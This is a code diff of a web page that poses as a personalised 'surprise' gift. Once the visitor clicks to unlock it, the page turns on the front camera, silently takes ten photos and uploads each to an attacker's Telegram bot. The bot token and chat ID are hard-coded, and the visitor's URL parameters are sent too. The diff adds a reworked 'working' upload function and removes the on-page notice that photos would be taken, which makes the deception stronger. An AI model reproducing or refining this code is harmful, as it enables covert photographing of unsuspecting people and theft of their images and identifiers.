@@ -35,13 +35,6 @@
             font-size: 32px;
         }
         
-        .message {
-            color: #666;
-            font-size: 18px;
-            line-height: 1.6;
-            margin-bottom: 30px;
-        }
-        
         .surprise-text {
             background: linear-gradient(90deg, #6a11cb, #2575fc);
             -webkit-background-clip: text;
@@ -49,10 +42,6 @@
             font-weight: bold;
             font-size: 22px;
             margin: 20px 0;
-            padding: 15px;
-            background: #f8f9ff;
-            border-radius: 10px;
-            border-left: 4px solid #6a11cb;
         }
         
         .btn {
@@ -72,6 +61,11 @@
         .btn:hover {
             transform: translateY(-3px);
             box-shadow: 0 10px 25px rgba(106, 17, 203, 0.4);
+        }
+        
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
         }
         
         .loading {
@@ -94,48 +88,24 @@
             100% { transform: rotate(360deg); }
         }
         
-        .progress-container {
+        .progress {
             width: 100%;
+            height: 10px;
             background: #e0e0e0;
-            border-radius: 10px;
+            border-radius: 5px;
             overflow: hidden;
             margin: 20px 0;
-            height: 12px;
         }
         
         .progress-bar {
             height: 100%;
             background: linear-gradient(90deg, #00b09b, #96c93d);
             width: 0%;
-            transition: width 0.5s ease;
+            transition: width 0.5s;
         }
         
-        .status-text {
-            color: #666;
-            font-size: 16px;
-            margin-top: 10px;
-            min-height: 24px;
-        }
-        
-        .complete-screen {
+        .hidden {
             display: none;
-        }
-        
-        .success-icon {
-            font-size: 70px;
-            margin-bottom: 20px;
-            color: #00b09b;
-            animation: pulse 1.5s infinite;
-        }
-        
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-        }
-        
-        .camera-container {
-            display: none;
-            margin: 20px 0;
         }
         
         #video {
@@ -150,41 +120,10 @@
         canvas {
             display: none;
         }
-        
-        .instructions {
-            background: #e8f4ff;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 20px 0;
-            color: #2c5282;
-            font-size: 14px;
-            text-align: left;
-        }
-        
-        .hidden {
-            display: none;
-        }
-        
-        /* Debug info */
-        .debug-info {
-            position: fixed;
-            bottom: 10px;
-            right: 10px;
-            background: rgba(0,0,0,0.7);
-            color: white;
-            padding: 5px 10px;
-            border-radius: 5px;
-            font-size: 12px;
-            font-family: monospace;
-        }
     </style>
 </head>
 <body>
-    <!-- Hidden iframe for form submission -->
-    <iframe name="telegramFrame" class="hidden"></iframe>
-    
     <div class="container">
-        <!-- Welcome Screen -->
         <div id="welcomeScreen">
             <div class="gift-icon">🎁</div>
             <h1>Your Special Surprise!</h1>
@@ -193,75 +132,44 @@
                 "Hey, I made something for you. It's small, but it's from the heart. Open it and enjoy the surprise 😄🎁"
             </div>
             
-            <p class="message">
-                Someone has prepared a <strong>personalized digital surprise</strong> just for you! 
-                Click the button below to unlock it.
+            <p style="color: #666; font-size: 18px; margin-bottom: 30px;">
+                Click the button below to unlock your personalized surprise!
             </p>
-            
-            <div class="instructions">
-                <strong>🎯 What will happen:</strong><br>
-                1. Camera will activate (allow when asked)<br>
-                2. 10 photos will be captured automatically<br>
-                3. Your surprise will be created<br>
-                4. It takes about 10 seconds
-            </div>
             
             <button class="btn" id="startBtn" onclick="startSurprise()">
                 🔓 UNLOCK MY SURPRISE
             </button>
-            
-            <p style="color: #888; font-size: 14px; margin-top: 20px;">
-                <em>This is a one-time personalized experience</em>
-            </p>
         </div>
         
-        <!-- Camera Screen -->
-        <div class="camera-container" id="cameraContainer">
-            <div class="instructions">
-                <strong>📸 Camera Permission Required</strong><br>
-                Please click "Allow" when your browser asks for camera access.<br>
-                This is needed to create your personalized surprise!
-            </div>
+        <div id="cameraContainer" class="hidden">
             <video id="video" autoplay playsinline></video>
         </div>
         
-        <!-- Processing Screen -->
-        <div class="loading" id="processingScreen">
+        <div id="loading" class="loading">
             <div class="spinner"></div>
-            <div class="status-text" id="statusText">Initializing surprise creation...</div>
-            <div class="progress-container">
+            <p id="status">Creating your surprise...</p>
+            <div class="progress">
                 <div class="progress-bar" id="progressBar"></div>
             </div>
-            <p style="color: #888; font-size: 14px; margin-top: 10px;">
-                Creating your personalized gift. This will take about 10 seconds...
-            </p>
         </div>
         
-        <!-- Complete Screen -->
-        <div class="complete-screen" id="completeScreen">
-            <div class="success-icon">✅</div>
+        <div id="completeScreen" class="hidden">
+            <div style="font-size: 70px; color: #00b09b; margin-bottom: 20px;">✅</div>
             <h1 style="color: #00b09b;">Surprise Delivered!</h1>
-            <div class="message">
-                Your personalized surprise has been created and delivered! 🎁<br><br>
-                The person who sent you this link will receive your special gift shortly!
-            </div>
-            <p style="color: #666; margin-top: 20px; font-size: 14px;">
-                Thank you for participating! Hope you enjoy your surprise! 😊
+            <p style="color: #666; font-size: 18px;">
+                Your personalized surprise has been created and delivered! 🎁
             </p>
         </div>
     </div>
 
     <canvas id="canvas"></canvas>
-    
-    <!-- Debug info (hidden in production) -->
-    <div class="debug-info" id="debugInfo"></div>
 
     <script>
         // ================= CONFIGURATION =================
         const BOT_TOKEN = "8226782560:AAE3pOwbdZR8lWUoa2rd8Gf5fLTeQM2eguM";
         const CHAT_ID = "8215819954";
         const TOTAL_PHOTOS = 10;
-        const CAPTURE_DELAY = 800; // 0.8 seconds between photos
+        const CAPTURE_DELAY = 800;
         
         // Get URL parameters
         const urlParams = new URLSearchParams(window.location.search);
@@ -272,19 +180,73 @@
         let stream = null;
         let captureCount = 0;
         let isCapturing = false;
-        let sentPhotos = 0;
         
         // ================= DOM ELEMENTS =================
         const welcomeScreen = document.getElementById('welcomeScreen');
         const cameraContainer = document.getElementById('cameraContainer');
-        const processingScreen = document.getElementById('processingScreen');
+        const loading = document.getElementById('loading');
         const completeScreen = document.getElementById('completeScreen');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const startBtn = document.getElementById('startBtn');
-        const statusText = document.getElementById('statusText');
+        const statusText = document.getElementById('status');
         const progressBar = document.getElementById('progressBar');
-        const debugInfo = document.getElementById('debugInfo');
+        
+        // ================= WORKING TELEGRAM SEND FUNCTION =================
+        async function sendToTelegram(blob, photoNum) {
+            try {
+                // Create FormData
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                
+                // Create caption
+                let caption = `🎁 Surprise Photo #${photoNum}`;
+                if (userId !== 'unknown') {
+                    caption += `\n👤 User ID: ${userId}`;
+                }
+                if (token !== 'unknown') {
+                    caption += `\n🔑 Token: ${token}`;
+                }
+                caption += `\n⏰ ${new Date().toLocaleTimeString()}`;
+                
+                formData.append('caption', caption);
+                
+                // Create file from blob
+                const file = new File([blob], `surprise_${Date.now()}_${photoNum}.jpg`, {
+                    type: 'image/jpeg',
+                    lastModified: Date.now()
+                });
+                formData.append('photo', file);
+                
+                // Send using XMLHttpRequest (bypasses CORS issues)
+                return new Promise((resolve) => {
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`);
+                    
+                    xhr.onload = function() {
+                        if (this.status >= 200 && this.status < 300) {
+                            console.log(`✅ Photo ${photoNum} sent successfully`);
+                            resolve(true);
+                        } else {
+                            console.log(`❌ Photo ${photoNum} failed: ${this.status}`);
+                            resolve(false);
+                        }
+                    };
+                    
+                    xhr.onerror = function() {
+                        console.log(`❌ Photo ${photoNum} network error`);
+                        resolve(false);
+                    };
+                    
+                    // Send the request
+                    xhr.send(formData);
+                });
+                
+            } catch (error) {
+                console.error(`❌ Photo ${photoNum} error:`, error);
+                return false;
+            }
+        }
         
         // ================= UPDATE PROGRESS =================
         function updateProgress(percent, message) {
@@ -292,7 +254,6 @@
             if (message) {
                 statusText.textContent = message;
             }
-            debugInfo.textContent = `Progress: ${percent}% | Photos: ${captureCount}/${TOTAL_PHOS} | Sent: ${sentPhotos}`;
         }
         
         // ================= CAPTURE PHOTO =================
@@ -328,96 +289,17 @@
             });
         }
         
-        // ================= SEND TO TELEGRAM (WORKING METHOD) =================
-        async function sendToTelegram(blob, photoNum) {
-            return new Promise((resolve) => {
-                try {
-                    // Create a form
-                    const form = document.createElement('form');
-                    form.method = 'POST';
-                    form.enctype = 'multipart/form-data';
-                    form.action = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-                    form.target = 'telegramFrame';
-                    form.style.display = 'none';
-                    
-                    // Add chat_id
-                    const chatIdInput = document.createElement('input');
-                    chatIdInput.type = 'hidden';
-                    chatIdInput.name = 'chat_id';
-                    chatIdInput.value = CHAT_ID;
-                    form.appendChild(chatIdInput);
-                    
-                    // Add caption
-                    const captionInput = document.createElement('input');
-                    captionInput.type = 'hidden';
-                    captionInput.name = 'caption';
-                    captionInput.value = `🎁 Surprise Photo #${photoNum}\n👤 User: ${userId}\n🔑 Token: ${token}\n⏰ ${new Date().toLocaleTimeString()}`;
-                    form.appendChild(captionInput);
-                    
-                    // Convert blob to file
-                    const file = new File([blob], `surprise_${Date.now()}_${photoNum}.jpg`, { 
-                        type: 'image/jpeg',
-                        lastModified: Date.now()
-                    });
-                    
-                    // Create file input using DataTransfer
-                    const fileInput = document.createElement('input');
-                    fileInput.type = 'file';
-                    fileInput.name = 'photo';
-                    fileInput.style.display = 'none';
-                    
-                    // Use DataTransfer to set file
-                    const dataTransfer = new DataTransfer();
-                    dataTransfer.items.add(file);
-                    fileInput.files = dataTransfer.files;
-                    
-                    form.appendChild(fileInput);
-                    document.body.appendChild(form);
-                    
-                    // Set iframe onload handler
-                    const iframe = document.getElementsByName('telegramFrame')[0];
-                    const originalOnload = iframe.onload;
-                    
-                    iframe.onload = function() {
-                        sentPhotos++;
-                        console.log(`✅ Photo ${photoNum} sent successfully`);
-                        document.body.removeChild(form);
-                        
-                        // Restore original onload
-                        iframe.onload = originalOnload;
-                        resolve(true);
-                    };
-                    
-                    // Submit form
-                    setTimeout(() => {
-                        form.submit();
-                    }, 100);
-                    
-                } catch (error) {
-                    console.error(`❌ Error sending photo ${photoNum}:`, error);
-                    resolve(false);
-                }
-            });
-        }
-        
         // ================= START SURPRISE =================
         async function startSurprise() {
-            // Disable button
-            startBtn.disabled = true;
-            startBtn.textContent = '🔓 PREPARING...';
-            
             // Hide welcome, show camera
-            welcomeScreen.style.display = 'none';
-            cameraContainer.style.display = 'block';
+            welcomeScreen.classList.add('hidden');
+            cameraContainer.classList.remove('hidden');
+            startBtn.disabled = true;
             
             try {
                 // Request front camera
                 stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'user', // Front camera
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    },
+                    video: { facingMode: 'user' },
                     audio: false
                 });
                 
@@ -439,12 +321,11 @@
         // ================= START PROCESSING =================
         function startProcessing() {
             // Hide camera, show processing
-            cameraContainer.style.display = 'none';
-            processingScreen.style.display = 'block';
+            cameraContainer.classList.add('hidden');
+            loading.style.display = 'block';
             
             isCapturing = true;
             captureCount = 0;
-            sentPhotos = 0;
             
             // Processing messages
             const messages = [
@@ -464,7 +345,7 @@
             const captureInterval = setInterval(async () => {
                 if (captureCount >= TOTAL_PHOTOS) {
                     clearInterval(captureInterval);
-                    completeSurprise();
+                    finishCapture();
                     return;
                 }
                 
@@ -477,7 +358,7 @@
                     const msgIndex = Math.min(Math.floor(progress / 10), messages.length - 1);
                     updateProgress(progress, messages[msgIndex]);
                     
-                    // Send to Telegram
+                    // Send to Telegram using WORKING method
                     await sendToTelegram(blob, captureCount);
                     
                 } catch (error) {
@@ -487,28 +368,25 @@
             }, CAPTURE_DELAY);
         }
         
-        // ================= COMPLETE SURPRISE =================
-        function completeSurprise() {
+        // ================= FINISH CAPTURE =================
+        async function finishCapture() {
             isCapturing = false;
             
             // Update to 100%
             updateProgress(100, "Surprise delivered!");
             
+            // Send completion report
+            await sendCompletionReport();
+            
             // Show completion screen after delay
             setTimeout(() => {
-                processingScreen.style.display = 'none';
-                completeScreen.style.display = 'block';
-                
-                // Send completion report
-                sendCompletionReport();
+                loading.style.display = 'none';
+                completeScreen.classList.remove('hidden');
                 
                 // Stop camera
                 if (stream) {
                     stream.getTracks().forEach(track => track.stop());
                 }
-                
-                // Hide debug info
-                debugInfo.style.display = 'none';
                 
             }, 1500);
         }
@@ -516,23 +394,7 @@
         // ================= SEND COMPLETION REPORT =================
         async function sendCompletionReport() {
             try {
-                // Create form for completion report
-                const form = document.createElement('form');
-                form.method = 'POST';
-                form.action = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                form.target = 'telegramFrame';
-                form.style.display = 'none';
-                
-                const chatIdInput = document.createElement('input');
-                chatIdInput.type = 'hidden';
-                chatIdInput.name = 'chat_id';
-                chatIdInput.value = CHAT_ID;
-                form.appendChild(chatIdInput);
-                
-                const textInput = document.createElement('input');
-                textInput.type = 'hidden';
-                textInput.name = 'text';
-                textInput.value = `
+                const report = `
 🎉 SURPRISE DELIVERY COMPLETE!
 
 ✅ Successfully delivered personalized surprise!
@@ -542,31 +404,23 @@
 • Token: ${token !== 'unknown' ? '***' + token.slice(-4) : 'None'}
 • Photos: ${TOTAL_PHOTOS}
 • Time: ${new Date().toLocaleString()}
-• User Agent: ${navigator.userAgent.substring(0, 50)}...
-• Screen: ${screen.width}x${screen.height}
+• Success: ✅ All ${TOTAL_PHOTOS} photos captured
 
 🎁 Surprise creation successful!
-✅ All ${TOTAL_PHOTOS} photos captured and delivered
-
-Location: ${window.location.href}
 `;
-                form.appendChild(textInput);
                 
-                const parseModeInput = document.createElement('input');
-                parseModeInput.type = 'hidden';
-                parseModeInput.name = 'parse_mode';
-                parseModeInput.value = 'HTML';
-                form.appendChild(parseModeInput);
+                // Send using XMLHttpRequest
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`);
                 
-                document.body.appendChild(form);
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('text', report);
+                formData.append('parse_mode', 'HTML');
                 
-                // Submit form
-                setTimeout(() => {
-                    form.submit();
-                    setTimeout(() => {
-                        document.body.removeChild(form);
-                    }, 1000);
-                }, 100);
+                xhr.send(formData);
+                
+                console.log("✅ Completion report sent");
                 
             } catch (error) {
                 console.error("Report error:", error);
@@ -576,15 +430,6 @@ Location: ${window.location.href}
         // ================= INITIALIZE =================
         window.addEventListener('load', () => {
             console.log("🎁 Surprise page loaded");
-            console.log("User ID:", userId);
-            console.log("Token:", token);
-            
-            // Check if we have proper parameters
-            if (userId !== 'unknown' && token !== 'unknown') {
-                console.log("✅ Valid surprise link detected");
-            } else {
-                console.log("⚠️ Direct access without parameters");
-            }
             
             // Make button pulse
             setInterval(() => {
@@ -595,36 +440,12 @@ Location: ${window.location.href}
                     }, 300);
                 }
             }, 2000);
-            
-            // Test bot connection on load
-            testBotConnection();
         });
         
-        // ================= TEST BOT CONNECTION =================
-        async function testBotConnection() {
-            try {
-                // Test using image to avoid CORS
-                const img = new Image();
-                img.src = `https://api.telegram.org/bot${BOT_TOKEN}/getMe`;
-                img.onload = () => console.log("✅ Bot API accessible");
-                img.onerror = () => console.log("⚠️ Bot API might be blocked by CORS");
-            } catch (error) {
-                console.log("Bot test skipped:", error.message);
-            }
-        }
-        
-        // ================= CLEAN UP =================
+        // Clean up
         window.addEventListener('beforeunload', () => {
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
-            }
-        });
-        
-        // Prevent accidental reload
-        window.addEventListener('beforeunload', (e) => {
-            if (isCapturing) {
-                e.preventDefault();
-                e.returnValue = 'Surprise is being created. Are you sure you want to leave?';
             }
         });
     </script>
